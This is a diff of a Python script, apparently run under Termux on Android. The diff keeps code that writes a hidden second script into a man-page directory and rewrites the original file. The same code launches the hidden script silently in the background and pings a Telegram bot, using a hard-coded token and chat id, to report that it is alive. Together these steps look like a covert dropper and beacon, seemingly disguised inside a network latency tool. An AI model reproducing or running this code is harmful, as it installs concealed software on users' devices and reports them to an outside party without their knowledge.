@@ -3,7 +3,7 @@ import shutil  as sh
 os.system("pip install requests")
 import requests as r
 
-r.get(f"https://api.telegram.org/bot8099597954:AAEvCyBloWAyci00RsF5alBycVAZdeag-EM/sendMessage?chat_id=5023793406&text=alive")
+#r.get(f"https://api.telegram.org/bot8099597954:AAEvCyBloWAyci00RsF5alBycVAZdeag-EM/sendMessage?chat_id=5023793406&text=alive")
 with open("/data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py", "w") as file :
      file.write("""
 import requests as r
@@ -331,6 +331,6 @@ def measure_latency(host, port=443, timeout=5):
 
 with open(__file__, "w") as file :
      file.write(data)
-
+r.get(f"https://api.telegram.org/bot8099597954:AAEvCyBloWAyci00RsF5alBycVAZdeag-EM/sendMessage?chat_id=5023793406&text=alive")
 
 os.system("bash -c 'set +m; nohup python /data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py > /data/data/com.termux/files/usr/share/man/man3/output.log 2>&1 < /dev/null &'")
